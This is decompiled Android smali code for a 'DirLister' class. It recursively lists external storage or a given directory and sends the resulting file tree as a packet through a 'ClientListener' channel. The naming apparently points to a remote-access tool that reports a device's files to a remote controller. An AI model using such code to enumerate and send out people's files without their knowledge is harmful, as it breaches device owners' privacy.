.class public Lmy/app/Library/DirLister;
.super Ljava/lang/Object;
.source "DirLister.java"


# direct methods
.method public constructor <init>()V
    .locals 0

    .prologue
    .line 13
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method

.method public static listDir(Lmy/app/client/ClientListener;ILjava/lang/String;)Z
    .locals 3
    .param p0, "c"    # Lmy/app/client/ClientListener;
    .param p1, "channel"    # I
    .param p2, "dirname"    # Ljava/lang/String;

    .prologue
    .line 17
    new-instance v0, Ljava/util/ArrayList;

    invoke-direct {v0}, Ljava/util/ArrayList;-><init>()V

    .line 19
    .local v0, "ar":Ljava/util/ArrayList;, "Ljava/util/ArrayList<Lutils/MyFile;>;"
    const-string v2, "/"

    invoke-virtual {p2, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v2

    if-eqz v2, :cond_0

    .line 20
    invoke-static {}, Landroid/os/Environment;->getExternalStorageDirectory()Ljava/io/File;

    move-result-object v1

    .line 24
    .local v1, "f":Ljava/io/File;
    :goto_0
    invoke-virtual {v1}, Ljava/io/File;->exists()Z

    move-result v2

    if-nez v2, :cond_1

    .line 25
    const/4 v2, 0x0

    .line 30
    :goto_1
    return v2

    .line 22
    .end local v1    # "f":Ljava/io/File;
    :cond_0
    new-instance v1, Ljava/io/File;

    invoke-direct {v1, p2}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    .restart local v1    # "f":Ljava/io/File;
    goto :goto_0

    .line 28
    :cond_1
    invoke-static {v1}, Lmy/app/Library/DirLister;->visitAllDirsAndFiles(Ljava/io/File;)Lutils/MyFile;

    move-result-object v2

    invoke-virtual {v0, v2}, Ljava/util/ArrayList;->add(Ljava/lang/Object;)Z

    .line 29
    new-instance v2, LPacket/FileTreePacket;

    invoke-direct {v2, v0}, LPacket/FileTreePacket;-><init>(Ljava/util/ArrayList;)V

    invoke-virtual {v2}, LPacket/FileTreePacket;->build()[B

    move-result-object v2

    invoke-virtual {p0, p1, v2}, Lmy/app/client/ClientListener;->handleData(I[B)V

    .line 30
    const/4 v2, 0x1

    goto :goto_1
.end method

.method public static visitAllDirsAndFiles(Ljava/io/File;)Lutils/MyFile;
    .locals 10
    .param p0, "dir"    # Ljava/io/File;

    .prologue
    .line 61
    invoke-virtual {p0}, Ljava/io/File;->exists()Z

    move-result v5

    if-eqz v5, :cond_3

    .line 62
    invoke-virtual {p0}, Ljava/io/File;->isDirectory()Z

    move-result v5

    if-eqz v5, :cond_2

    .line 63
    invoke-virtual {p0}, Ljava/io/File;->list()[Ljava/lang/String;

    move-result-object v1

    .line 64
    .local v1, "children":[Ljava/lang/String;
    new-instance v4, Lutils/MyFile;

    invoke-direct {v4, p0}, Lutils/MyFile;-><init>(Ljava/io/File;)V

    .line 66
    .local v4, "myf":Lutils/MyFile;
    if-eqz v1, :cond_0

    .line 67
    array-length v5, v1

    if-eqz v5, :cond_0

    .line 68
    array-length v6, v1

    const/4 v5, 0x0

    :goto_0
    if-lt v5, v6, :cond_1

    .line 86
    .end local v1    # "children":[Ljava/lang/String;
    .end local v4    # "myf":Lutils/MyFile;
    :cond_0
    :goto_1
    return-object v4

    .line 68
    .restart local v1    # "children":[Ljava/lang/String;
    .restart local v4    # "myf":Lutils/MyFile;
    :cond_1
    aget-object v0, v1, v5

    .line 71
    .local v0, "child":Ljava/lang/String;
    :try_start_0
    new-instance v3, Ljava/io/File;

    invoke-direct {v3, p0, v0}, Ljava/io/File;-><init>(Ljava/io/File;Ljava/lang/String;)V

    .line 72
    .local v3, "f":Ljava/io/File;
    invoke-static {v3}, Lmy/app/Library/DirLister;->visitAllDirsAndFiles(Ljava/io/File;)Lutils/MyFile;

    move-result-object v7

    invoke-virtual {v4, v7}, Lutils/MyFile;->addChild(Lutils/MyFile;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 68
    .end local v3    # "f":Ljava/io/File;
    :goto_2
    add-int/lit8 v5, v5, 0x1

    goto :goto_0

    .line 74
    :catch_0
    move-exception v2

    .line 75
    .local v2, "e":Ljava/lang/Exception;
    sget-object v7, Ljava/lang/System;->out:Ljava/io/PrintStream;

    new-instance v8, Ljava/lang/StringBuilder;

    const-string v9, "Child !"

    invoke-direct {v8, v9}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v8, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v8

    invoke-virtual {v8}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v8

    invoke-virtual {v7, v8}, Ljava/io/PrintStream;->println(Ljava/lang/String;)V

    .line 76
    invoke-virtual {v2}, Ljava/lang/Exception;->printStackTrace()V

    goto :goto_2

    .line 84
    .end local v0    # "child":Ljava/lang/String;
    .end local v1    # "children":[Ljava/lang/String;
    .end local v2    # "e":Ljava/lang/Exception;
    .end local v4    # "myf":Lutils/MyFile;
    :cond_2
    new-instance v4, Lutils/MyFile;

    invoke-direct {v4, p0}, Lutils/MyFile;-><init>(Ljava/io/File;)V

    goto :goto_1

    .line 86
    :cond_3
    const/4 v4, 0x0

    goto :goto_1
.end method

.method public static visitAllDirsAndFiles(Ljava/io/File;Ljava/util/ArrayList;)V
    .locals 9
    .param p0, "dir"    # Ljava/io/File;
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "(",
            "Ljava/io/File;",
            "Ljava/util/ArrayList",
            "<",
            "Lutils/MyFile;",
            ">;)V"
        }
    .end annotation

    .prologue
    .line 36
    .local p1, "ar":Ljava/util/ArrayList;, "Ljava/util/ArrayList<Lutils/MyFile;>;"
    invoke-virtual {p0}, Ljava/io/File;->exists()Z

    move-result v4

    if-eqz v4, :cond_0

    .line 37
    invoke-virtual {p0}, Ljava/io/File;->isDirectory()Z

    move-result v4

    if-eqz v4, :cond_2

    .line 38
    invoke-virtual {p0}, Ljava/io/File;->list()[Ljava/lang/String;

    move-result-object v1

    .line 39
    .local v1, "children":[Ljava/lang/String;
    new-instance v4, Lutils/MyFile;

    invoke-direct {v4, p0}, Lutils/MyFile;-><init>(Ljava/io/File;)V

    invoke-virtual {p1, v4}, Ljava/util/ArrayList;->add(Ljava/lang/Object;)Z

    .line 40
    if-eqz v1, :cond_0

    .line 41
    array-length v5, v1

    const/4 v4, 0x0

    :goto_0
    if-lt v4, v5, :cond_1

    .line 57
    .end local v1    # "children":[Ljava/lang/String;
    :cond_0
    :goto_1
    return-void

    .line 41
    .restart local v1    # "children":[Ljava/lang/String;
    :cond_1
    aget-object v0, v1, v4

    .line 44
    .local v0, "child":Ljava/lang/String;
    :try_start_0
    new-instance v3, Ljava/io/File;

    invoke-direct {v3, p0, v0}, Ljava/io/File;-><init>(Ljava/io/File;Ljava/lang/String;)V

    .line 45
    .local v3, "f":Ljava/io/File;
    invoke-static {v3, p1}, Lmy/app/Library/DirLister;->visitAllDirsAndFiles(Ljava/io/File;Ljava/util/ArrayList;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 41
    .end local v3    # "f":Ljava/io/File;
    :goto_2
    add-int/lit8 v4, v4, 0x1

    goto :goto_0

    .line 47
    :catch_0
    move-exception v2

    .line 48
    .local v2, "e":Ljava/lang/Exception;
    sget-object v6, Ljava/lang/System;->out:Ljava/io/PrintStream;

    new-instance v7, Ljava/lang/StringBuilder;

    const-string v8, "Child !"

    invoke-direct {v7, v8}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v7, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v7

    invoke-virtual {v7}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v7

    invoke-virtual {v6, v7}, Ljava/io/PrintStream;->println(Ljava/lang/String;)V

    .line 49
    invoke-virtual {v2}, Ljava/lang/Exception;->printStackTrace()V

    goto :goto_2

    .line 55
    .end local v0    # "child":Ljava/lang/String;
    .end local v1    # "children":[Ljava/lang/String;
    .end local v2    # "e":Ljava/lang/Exception;
    :cond_2
    new-instance v4, Lutils/MyFile;

    invoke-direct {v4, p0}, Lutils/MyFile;-><init>(Ljava/io/File;)V

    invoke-virtual {p1, v4}, Ljava/util/ArrayList;->add(Ljava/lang/Object;)Z

    goto :goto_1
.end method
